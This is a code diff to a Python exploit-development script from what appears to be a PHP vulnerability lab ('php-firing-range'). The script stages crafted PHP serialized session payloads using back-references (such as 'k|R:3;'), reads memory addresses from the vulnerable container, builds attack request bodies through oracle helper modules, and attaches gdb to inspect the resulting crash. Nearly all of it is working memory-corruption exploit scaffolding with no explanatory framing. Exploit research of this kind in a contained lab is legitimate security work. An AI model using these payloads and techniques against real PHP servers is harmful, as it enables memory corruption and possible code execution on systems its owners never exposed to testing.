@@ -4,6 +4,7 @@ sys.path.insert(0, "/home/user/php-firing-range/scripts")
 import smb_q1_fatal_window as q
 import smb_619_state as s
 import smb_oracle as o
+import smb_oracle5 as o5
 daddr_hex = None
 
 q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
@@ -30,8 +31,12 @@ for off in range(0, len(seg)-15, 8):
         d_addr = v; break
 print(f"d = 0x{d_addr:x}")
 gsid = f"ogc{int(time.time())}"
-o.stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}')
-body = o.build_body(gsid, d_addr, None)
+o.stage(gsid, b'k|R:3;')
+import smb_oracle6 as o6
+raw = s.read_mem('vuln', d_addr, 0x18)
+chunk = int.from_bytes(raw[0x10:0x18],'little')
+print('chunk:', hex(chunk))
+body = o6.build_body(gsid, chunk)
 pid_out, _ = s.helper("vuln", "pid")
 pid = pid_out.strip()
 open('/home/user/php-firing-range/scripts/oracle-triage.gdb','w').write(
@@ -40,9 +45,9 @@ open('/home/user/php-firing-range/scripts/oracle-triage.gdb','w').write(
     "echo ===CRASH===\\n\n"
     "info registers x1 x19 x20 x21 x22 pc\n"
     "x/4i $pc\n"
-    "x/32gx %d\n"
-    "x/32gx %d+0x400\n"
-    "bt 8\ndetach\nquit\n" % (d_addr, d_addr))
+    "x/8gx %d\n"
+    "x/40gx %d\n"
+    "bt 8\ndetach\nquit\n" % (d_addr, chunk))
 cmd = ["docker","run","--rm","--cap-add","SYS_PTRACE","--pid=container:"+q.CT["vuln"],
        "-v","/home/user/php-firing-range/scripts:/sc:ro","smb-gdb-helper",
        "gdb","-batch","-p",pid,"-x","/sc/oracle-triage.gdb"]
